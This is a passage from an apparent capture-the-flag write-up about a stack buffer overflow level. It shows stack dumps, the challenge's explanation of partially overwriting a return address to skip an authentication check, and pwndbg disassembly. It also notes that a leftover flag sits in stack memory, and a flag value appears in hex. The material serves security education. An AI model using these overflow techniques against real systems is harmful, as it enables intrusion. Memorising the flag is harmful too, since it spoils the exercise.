| 0x00007fff5f329558 (rsp+0x0098) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329560 (rsp+0x00a0) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
| 0x00007fff5f329568 (rsp+0x00a8) | 9a 65 c3 58 7a 73 00 00 | 0x0000737a58c3659a |
| 0x00007fff5f329570 (rsp+0x00b0) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f329578 (rsp+0x00b8) | 00 97 32 5f ff 7f 00 00 | 0x00007fff5f329700 |
| 0x00007fff5f329580 (rsp+0x00c0) | e0 b1 1f e6 c6 60 00 00 | 0x000060c6e61fb1e0 |
| 0x00007fff5f329588 (rsp+0x00c8) | 30 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a830 |
| 0x00007fff5f329590 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f329598 (rsp+0x00d8) | ea c5 1f e6 c6 60 00 00 | 0x000060c6e61fc5ea |
| 0x00007fff5f3295a0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295a8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295b0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295b8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295c0 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295c8 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295d0 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295d8 (rsp+0x0118) | 93 11 dc 58 7a 73 00 00 | 0x0000737a58dc1193 |
| 0x00007fff5f3295e0 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
| 0x00007fff5f3295e8 (rsp+0x0128) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
| 0x00007fff5f3295f0 (rsp+0x0130) | 00 40 da 58 7a 73 70 77 | 0x7770737a58da4000 |
| 0x00007fff5f3295f8 (rsp+0x0138) | 6e 2e 63 6f 6c 6c 65 67 | 0x67656c6c6f632e6e |
| 0x00007fff5f329600 (rsp+0x0140) | 65 7b 34 6d 6f 7a 45 4c | 0x4c457a6f6d347b65 |
| 0x00007fff5f329608 (rsp+0x0148) | 34 6a 30 5a 35 53 38 69 | 0x693853355a306a34 |
| 0x00007fff5f329610 (rsp+0x0150) | 6b 30 38 42 7a 6e 72 52 | 0x52726e7a4238306b |
| 0x00007fff5f329618 (rsp+0x0158) | 61 71 39 66 57 2e 30 31 | 0x31302e5766397161 |
| 0x00007fff5f329620 (rsp+0x0160) | 4d 78 4d 44 4c 34 49 54 | 0x5449344c444d784d |
| 0x00007fff5f329628 (rsp+0x0168) | 4d 30 45 7a 57 7d 0a 00 | 0x000a7d577a45304d |
| 0x00007fff5f329630 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007fff5f329638 (rsp+0x0178) | 10 97 32 5f ff 7f 00 00 | 0x00007fff5f329710 |
| 0x00007fff5f329640 (rsp+0x0180) | 50 96 32 5f ff 7f 00 00 | 0x00007fff5f329650 |
| 0x00007fff5f329648 (rsp+0x0188) | 8d 0e c4 58 7a 73 00 00 | 0x0000737a58c40e8d |
| 0x00007fff5f329650 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007fff5f329658 (rsp+0x0198) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329660 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fff5f329668 (rsp+0x01a8) | 23 f7 d9 58 7a 73 00 00 | 0x0000737a58d9f723 |
| 0x00007fff5f329670 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329678 (rsp+0x01b8) | 51 29 c4 58 7a 73 00 00 | 0x0000737a58c42951 |
| 0x00007fff5f329680 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329688 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f329690 (rsp+0x01d0) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329698 (rsp+0x01d8) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f3296a0 (rsp+0x01e0) | 40 55 da 58 7a 73 00 00 | 0x0000737a58da5540 |
| 0x00007fff5f3296a8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3296b0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3296b8 (rsp+0x01f8) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
| 0x00007fff5f3296c0 (rsp+0x0200) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f3296c8 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f3296d0 (rsp+0x0210) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f3296d8 (rsp+0x0218) | 02 83 c3 58 7a 73 00 00 | 0x0000737a58c38302 |
| 0x00007fff5f3296e0 (rsp+0x0220) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f3296e8 (rsp+0x0228) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f3296f0 (rsp+0x0230) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
| 0x00007fff5f3296f8 (rsp+0x0238) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
| 0x00007fff5f329700 (rsp+0x0240) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
| 0x00007fff5f329708 (rsp+0x0248) | 98 ce 1f e6 c6 60 00 00 | 0x000060c6e61fce98 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff5f3294c0, and our base pointer points to 0x7fff5f329700.
This means that we have (decimal) 74 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 592 bytes.
The input buffer begins at 0x7fff5f329500, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 490 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fff5f329708, 520 bytes after the start of your input buffer.
That means that you will need to input at least 528 bytes (490 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Because the binary is position independent, you cannot know
exactly where the win_authed() function is located.
This means that it is not clear what should be written into the return address.

Payload size: 2
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7fff5f329500 (the start of the input buffer)
right up to (but not including) 0x7fff5f329502 (which is -488 bytes beyond the end of the buffer).
Of these, you will overwrite -518 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few times until it works
(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7fff5f329708, 520 bytes into the buffer)
with the correct value.

Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff5f3294c0 (rsp+0x0000) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007fff5f3294c8 (rsp+0x0008) | 48 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a848 |
| 0x00007fff5f3294d0 (rsp+0x0010) | 38 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a838 |
| 0x00007fff5f3294d8 (rsp+0x0018) | 00 6d fd bf 01 00 00 00 | 0x00000001bffd6d00 |
| 0x00007fff5f3294e0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3294e8 (rsp+0x0028) | f6 95 32 5f 02 00 00 00 | 0x000000025f3295f6 |
| 0x00007fff5f3294f0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
| 0x00007fff5f3294f8 (rsp+0x0038) | 00 95 32 5f ff 7f 00 00 | 0x00007fff5f329500 |
| 0x00007fff5f329500 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007fff5f329508 (rsp+0x0048) | 33 00 00 00 00 00 00 00 | 0x0000000000000033 |
| 0x00007fff5f329510 (rsp+0x0050) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329518 (rsp+0x0058) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f329520 (rsp+0x0060) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329528 (rsp+0x0068) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
| 0x00007fff5f329530 (rsp+0x0070) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f329538 (rsp+0x0078) | a0 b4 d9 58 7a 73 00 00 | 0x0000737a58d9b4a0 |
| 0x00007fff5f329540 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f329548 (rsp+0x0088) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
| 0x00007fff5f329550 (rsp+0x0090) | 75 00 00 00 00 00 00 00 | 0x0000000000000075 |
| 0x00007fff5f329558 (rsp+0x0098) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329560 (rsp+0x00a0) | f8 d1 1f e6 c6 60 00 00 | 0x000060c6e61fd1f8 |
| 0x00007fff5f329568 (rsp+0x00a8) | 9a 65 c3 58 7a 73 00 00 | 0x0000737a58c3659a |
| 0x00007fff5f329570 (rsp+0x00b0) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f329578 (rsp+0x00b8) | 00 97 32 5f ff 7f 00 00 | 0x00007fff5f329700 |
| 0x00007fff5f329580 (rsp+0x00c0) | e0 b1 1f e6 c6 60 00 00 | 0x000060c6e61fb1e0 |
| 0x00007fff5f329588 (rsp+0x00c8) | 30 a8 32 5f ff 7f 00 00 | 0x00007fff5f32a830 |
| 0x00007fff5f329590 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f329598 (rsp+0x00d8) | ea c5 1f e6 c6 60 00 00 | 0x000060c6e61fc5ea |
| 0x00007fff5f3295a0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295a8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295b0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295b8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295c0 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295c8 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295d0 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3295d8 (rsp+0x0118) | 93 11 dc 58 7a 73 00 00 | 0x0000737a58dc1193 |
| 0x00007fff5f3295e0 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
| 0x00007fff5f3295e8 (rsp+0x0128) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
| 0x00007fff5f3295f0 (rsp+0x0130) | 00 40 da 58 7a 73 70 77 | 0x7770737a58da4000 |
| 0x00007fff5f3295f8 (rsp+0x0138) | 6e 2e 63 6f 6c 6c 65 67 | 0x67656c6c6f632e6e |
| 0x00007fff5f329600 (rsp+0x0140) | 65 7b 34 6d 6f 7a 45 4c | 0x4c457a6f6d347b65 |
| 0x00007fff5f329608 (rsp+0x0148) | 34 6a 30 5a 35 53 38 69 | 0x693853355a306a34 |
| 0x00007fff5f329610 (rsp+0x0150) | 6b 30 38 42 7a 6e 72 52 | 0x52726e7a4238306b |
| 0x00007fff5f329618 (rsp+0x0158) | 61 71 39 66 57 2e 30 31 | 0x31302e5766397161 |
| 0x00007fff5f329620 (rsp+0x0160) | 4d 78 4d 44 4c 34 49 54 | 0x5449344c444d784d |
| 0x00007fff5f329628 (rsp+0x0168) | 4d 30 45 7a 57 7d 0a 00 | 0x000a7d577a45304d |
| 0x00007fff5f329630 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007fff5f329638 (rsp+0x0178) | 10 97 32 5f ff 7f 00 00 | 0x00007fff5f329710 |
| 0x00007fff5f329640 (rsp+0x0180) | 50 96 32 5f ff 7f 00 00 | 0x00007fff5f329650 |
| 0x00007fff5f329648 (rsp+0x0188) | 8d 0e c4 58 7a 73 00 00 | 0x0000737a58c40e8d |
| 0x00007fff5f329650 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007fff5f329658 (rsp+0x0198) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329660 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fff5f329668 (rsp+0x01a8) | 23 f7 d9 58 7a 73 00 00 | 0x0000737a58d9f723 |
| 0x00007fff5f329670 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329678 (rsp+0x01b8) | 51 29 c4 58 7a 73 00 00 | 0x0000737a58c42951 |
| 0x00007fff5f329680 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff5f329688 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f329690 (rsp+0x01d0) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f329698 (rsp+0x01d8) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f3296a0 (rsp+0x01e0) | 40 55 da 58 7a 73 00 00 | 0x0000737a58da5540 |
| 0x00007fff5f3296a8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3296b0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff5f3296b8 (rsp+0x01f8) | 93 2e c4 58 7a 73 00 00 | 0x0000737a58c42e93 |
| 0x00007fff5f3296c0 (rsp+0x0200) | a0 f6 d9 58 7a 73 00 00 | 0x0000737a58d9f6a0 |
| 0x00007fff5f3296c8 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007fff5f3296d0 (rsp+0x0210) | 20 00 20 e6 c6 60 00 00 | 0x000060c6e6200020 |
| 0x00007fff5f3296d8 (rsp+0x0218) | 02 83 c3 58 7a 73 00 00 | 0x0000737a58c38302 |
| 0x00007fff5f3296e0 (rsp+0x0220) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f3296e8 (rsp+0x0228) | c0 ce 1f e6 c6 60 00 00 | 0x000060c6e61fcec0 |
| 0x00007fff5f3296f0 (rsp+0x0230) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
| 0x00007fff5f3296f8 (rsp+0x0238) | 00 6d fd bf 7d 89 fd b8 | 0xb8fd897dbffd6d00 |
| 0x00007fff5f329700 (rsp+0x0240) | 40 a7 32 5f ff 7f 00 00 | 0x00007fff5f32a740 |
| 0x00007fff5f329708 (rsp+0x0248) | 98 ce 1f e6 c6 60 00 00 | 0x000060c6e61fce98 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff5f329500
- the saved frame pointer (of main) is at 0x7fff5f329700
- the saved return address (previously to main) is at 0x7fff5f329708
- the saved return address is now pointing to 0x60c6e61fce98.
- the canary is stored at 0x7fff5f3296f8.
- the canary value is now 0xb8fd897dbffd6d00.
- the address of win_authed() is 0x60c6e61fc452.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

You said: aa
Goodbye!
### Goodbye!
```

Since the stack is not cleared from the last function call, the artifacts, including the flag are still there in the stack.

Let's see which functions this binary has.

### Binary Anaysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001100  __cxa_finalize@plt
0x0000000000001110  putchar@plt
0x0000000000001120  __errno_location@plt
0x0000000000001130  puts@plt
0x0000000000001140  write@plt
0x0000000000001150  __stack_chk_fail@plt
0x0000000000001160  printf@plt
0x0000000000001170  geteuid@plt
0x0000000000001180  read@plt
0x0000000000001190  setvbuf@plt
0x00000000000011a0  open@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  exit@plt
0x00000000000011d0  strerror@plt
0x00000000000011e0  _start
0x0000000000001210  deregister_tm_clones
0x0000000000001240  register_tm_clones
0x0000000000001280  __do_global_dtors_aux
0x00000000000012c0  frame_dummy
0x00000000000012c9  DUMP_STACK
0x00000000000014cc  bin_padding
0x0000000000002452  win_authed
0x000000000000256f  verify_flag
0x0000000000002601  challenge
0x0000000000002db9  main
0x0000000000002ec0  __libc_csu_init
0x0000000000002f30  __libc_csu_fini
0x0000000000002f38  _fini
```

The `verify_flag()` function is new.

#### `verify_flag()`

```
pwndbg> disassemble verify_flag 
Dump of assembler code for function verify_flag:
   0x000000000000256f <+0>:     endbr64
   0x0000000000002573 <+4>:     push   rbp
   0x0000000000002574 <+5>:     mov    rbp,rsp
   0x0000000000002577 <+8>:     sub    rsp,0x160
   0x000000000000257e <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000002587 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000258b <+28>:    xor    eax,eax
   0x000000000000258d <+30>:    mov    esi,0x0
   0x0000000000002592 <+35>:    lea    rdi,[rip+0xb73]        # 0x310c
   0x0000000000002599 <+42>:    mov    eax,0x0
   0x000000000000259e <+47>:    call   0x11a0 <open@plt>
   0x00000000000025a3 <+52>:    mov    ecx,eax
   0x00000000000025a5 <+54>:    lea    rax,[rbp-0x160]
   0x00000000000025ac <+61>:    add    rax,0x56
   0x00000000000025b0 <+65>:    mov    edx,0x100
   0x00000000000025b5 <+70>:    mov    rsi,rax
   0x00000000000025b8 <+73>:    mov    edi,ecx
   0x00000000000025ba <+75>:    call   0x1180 <read@plt>
   0x00000000000025bf <+80>:    lea    rdi,[rip+0xc32]        # 0x31f8
   0x00000000000025c6 <+87>:    call   0x1130 <puts@plt>
   0x00000000000025cb <+92>:    lea    rax,[rbp-0x160]
   0x00000000000025d2 <+99>:    add    rax,0x56
   0x00000000000025d6 <+103>:   mov    rsi,rax
   0x00000000000025d9 <+106>:   lea    rdi,[rip+0xc90]        # 0x3270
   0x00000000000025e0 <+113>:   mov    eax,0x0
   0x00000000000025e5 <+118>:   call   0x1160 <printf@plt>
   0x00000000000025ea <+123>:   nop
   0x00000000000025eb <+124>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000025ef <+128>:   xor    rdx,QWORD PTR fs:0x28
   0x00000000000025f8 <+137>:   je     0x25ff <verify_flag+144>
   0x00000000000025fa <+139>:   call   0x1150 <__stack_chk_fail@plt>
   0x00000000000025ff <+144>:   leave
   0x0000000000002600 <+145>:   ret
End of assembler dump.
```

We can see that this function reads the flag at `rbp-0x160+0x56`.
Let's set a breakpoint at `werify_flag+75` to see where the flag is read.

```
pwndbg> break *(verify_flag+75)
Breakpoint 1 at 0x25ba
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000002601 <+0>:     endbr64
   0x0000000000002605 <+4>:     push   rbp
   0x0000000000002606 <+5>:     mov    rbp,rsp
   0x0000000000002609 <+8>:     sub    rsp,0x240
   0x0000000000002610 <+15>:    mov    DWORD PTR [rbp-0x224],edi
   0x0000000000002616 <+21>:    mov    QWORD PTR [rbp-0x230],rsi
   0x000000000000261d <+28>:    mov    QWORD PTR [rbp-0x238],rdx
   0x0000000000002624 <+35>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000262d <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000002631 <+48>:    xor    eax,eax
   0x0000000000002633 <+50>:    lea    rax,[rbp-0x200]
   0x000000000000263a <+57>:    mov    QWORD PTR [rbp-0x208],rax
   0x0000000000002641 <+64>:    mov    QWORD PTR [rbp-0x210],0x0
   0x000000000000264c <+75>:    lea    rdi,[rip+0xc45]        # 0x3298
   0x0000000000002653 <+82>:    call   0x1130 <puts@plt>
   0x0000000000002658 <+87>:    lea    rdi,[rip+0xc71]        # 0x32d0
   0x000000000000265f <+94>:    call   0x1130 <puts@plt>
   0x0000000000002664 <+99>:    lea    rdi,[rip+0xc9d]        # 0x3308
   0x000000000000266b <+106>:   call   0x1130 <puts@plt>
   0x0000000000002670 <+111>:   lea    rdi,[rip+0xcad]        # 0x3324
   0x0000000000002677 <+118>:   call   0x1130 <puts@plt>
   0x000000000000267c <+123>:   mov    rax,rsp
   0x000000000000267f <+126>:   mov    QWORD PTR [rip+0x3b12],rax        # 0x6198 <sp_>
   0x0000000000002686 <+133>:   mov    rax,rbp
   0x0000000000002689 <+136>:   mov    QWORD PTR [rip+0x3ae8],rax        # 0x6178 <bp_>
   0x0000000000002690 <+143>:   mov    rdx,QWORD PTR [rip+0x3ae1]        # 0x6178 <bp_>
   0x0000000000002697 <+150>:   mov    rax,QWORD PTR [rip+0x3afa]        # 0x6198 <sp_>
   0x000000000000269e <+157>:   sub    rdx,rax
   0x00000000000026a1 <+160>:   mov    rax,rdx
   0x00000000000026a4 <+163>:   shr    rax,0x3
   0x00000000000026a8 <+167>:   add    rax,0x2
   0x00000000000026ac <+171>:   mov    QWORD PTR [rip+0x3ad5],rax        # 0x6188 <sz_>
   0x00000000000026b3 <+178>:   mov    rax,QWORD PTR [rip+0x3abe]        # 0x6178 <bp_>
   0x00000000000026ba <+185>:   add    rax,0x8
   0x00000000000026be <+189>:   mov    QWORD PTR [rip+0x3acb],rax        # 0x6190 <rp_>
   0x00000000000026c5 <+196>:   lea    rdi,[rip+0xc5c]        # 0x3328
   0x00000000000026cc <+203>:   call   0x1130 <puts@plt>
   0x00000000000026d1 <+208>:   mov    rdx,QWORD PTR [rip+0x3ab0]        # 0x6188 <sz_>
   0x00000000000026d8 <+215>:   mov    rax,QWORD PTR [rip+0x3ab9]        # 0x6198 <sp_>
   0x00000000000026df <+222>:   mov    rsi,rdx
   0x00000000000026e2 <+225>:   mov    rdi,rax
   0x00000000000026e5 <+228>:   call   0x12c9 <DUMP_STACK>
   0x00000000000026ea <+233>:   mov    rdx,QWORD PTR [rip+0x3a87]        # 0x6178 <bp_>
   0x00000000000026f1 <+240>:   mov    rax,QWORD PTR [rip+0x3aa0]        # 0x6198 <sp_>
   0x00000000000026f8 <+247>:   mov    rsi,rax
   0x00000000000026fb <+250>:   lea    rdi,[rip+0xc6e]        # 0x3370
   0x0000000000002702 <+257>:   mov    eax,0x0
   0x0000000000002707 <+262>:   call   0x1160 <printf@plt>
   0x000000000000270c <+267>:   mov    rax,QWORD PTR [rip+0x3a75]        # 0x6188 <sz_>
   0x0000000000002713 <+274>:   mov    rsi,rax
   0x0000000000002716 <+277>:   lea    rdi,[rip+0xc9b]        # 0x33b8
   0x000000000000271d <+284>:   mov    eax,0x0
   0x0000000000002722 <+289>:   call   0x1160 <printf@plt>
   0x0000000000002727 <+294>:   lea    rdi,[rip+0xcd2]        # 0x3400
   0x000000000000272e <+301>:   call   0x1130 <puts@plt>
   0x0000000000002733 <+306>:   mov    rax,QWORD PTR [rip+0x3a4e]        # 0x6188 <sz_>
   0x000000000000273a <+313>:   shl    rax,0x3
   0x000000000000273e <+317>:   mov    rsi,rax
   0x0000000000002741 <+320>:   lea    rdi,[rip+0xcfd]        # 0x3445
   0x0000000000002748 <+327>:   mov    eax,0x0
   0x000000000000274d <+332>:   call   0x1160 <printf@plt>
   0x0000000000002752 <+337>:   mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002759 <+344>:   mov    rsi,rax
   0x000000000000275c <+347>:   lea    rdi,[rip+0xcfd]        # 0x3460
   0x0000000000002763 <+354>:   mov    eax,0x0
   0x0000000000002768 <+359>:   call   0x1160 <printf@plt>
   0x000000000000276d <+364>:   lea    rdi,[rip+0xd34]        # 0x34a8
   0x0000000000002774 <+371>:   call   0x1130 <puts@plt>
   0x0000000000002779 <+376>:   lea    rdi,[rip+0xd78]        # 0x34f8
   0x0000000000002780 <+383>:   call   0x1130 <puts@plt>
   0x0000000000002785 <+388>:   mov    esi,0x1ea
   0x000000000000278a <+393>:   lea    rdi,[rip+0xd97]        # 0x3528
   0x0000000000002791 <+400>:   mov    eax,0x0
   0x0000000000002796 <+405>:   call   0x1160 <printf@plt>
   0x000000000000279b <+410>:   lea    rdi,[rip+0xdde]        # 0x3580
   0x00000000000027a2 <+417>:   call   0x1130 <puts@plt>
   0x00000000000027a7 <+422>:   lea    rdi,[rip+0xe0a]        # 0x35b8
   0x00000000000027ae <+429>:   call   0x1130 <puts@plt>
   0x00000000000027b3 <+434>:   lea    rdi,[rip+0xe2e]        # 0x35e8
   0x00000000000027ba <+441>:   call   0x1130 <puts@plt>
   0x00000000000027bf <+446>:   lea    rdi,[rip+0xe6a]        # 0x3630
   0x00000000000027c6 <+453>:   call   0x1130 <puts@plt>
   0x00000000000027cb <+458>:   mov    rdx,QWORD PTR [rip+0x39be]        # 0x6190 <rp_>
   0x00000000000027d2 <+465>:   mov    rax,QWORD PTR [rbp-0x208]
   0x00000000000027d9 <+472>:   sub    rdx,rax
   0x00000000000027dc <+475>:   mov    rax,QWORD PTR [rip+0x39ad]        # 0x6190 <rp_>
   0x00000000000027e3 <+482>:   mov    rsi,rax
   0x00000000000027e6 <+485>:   lea    rdi,[rip+0xe8b]        # 0x3678
   0x00000000000027ed <+492>:   mov    eax,0x0
   0x00000000000027f2 <+497>:   call   0x1160 <printf@plt>
   0x00000000000027f7 <+502>:   mov    rdx,QWORD PTR [rip+0x3992]        # 0x6190 <rp_>
   0x00000000000027fe <+509>:   mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002805 <+516>:   sub    rdx,rax
   0x0000000000002808 <+519>:   mov    rax,rdx
   0x000000000000280b <+522>:   add    rax,0x8
   0x000000000000280f <+526>:   mov    edx,0x1ea
   0x0000000000002814 <+531>:   mov    rsi,rax
   0x0000000000002817 <+534>:   lea    rdi,[rip+0xea2]        # 0x36c0
   0x000000000000281e <+541>:   mov    eax,0x0
   0x0000000000002823 <+546>:   call   0x1160 <printf@plt>
   0x0000000000002828 <+551>:   mov    rdx,QWORD PTR [rip+0x3961]        # 0x6190 <rp_>
   0x000000000000282f <+558>:   mov    rax,QWORD PTR [rbp-0x208]
   0x0000000000002836 <+565>:   sub    rdx,rax
   0x0000000000002839 <+568>:   mov    rax,rdx
   0x000000000000283c <+571>:   sub    rax,0x1ea
   0x0000000000002842 <+577>:   mov    rsi,rax
   0x0000000000002845 <+580>:   lea    rdi,[rip+0xecc]        # 0x3718
   0x000000000000284c <+587>:   mov    eax,0x0
   0x0000000000002851 <+592>:   call   0x1160 <printf@plt>
   0x0000000000002856 <+597>:   lea    rdi,[rip+0xf0b]        # 0x3768
   0x000000000000285d <+604>:   call   0x1130 <puts@plt>
   0x0000000000002862 <+609>:   mov    rax,QWORD PTR [rip+0x390f]        # 0x6178 <bp_>
   0x0000000000002869 <+616>:   mov    QWORD PTR [rip+0x3900],rax        # 0x6170 <cp_>
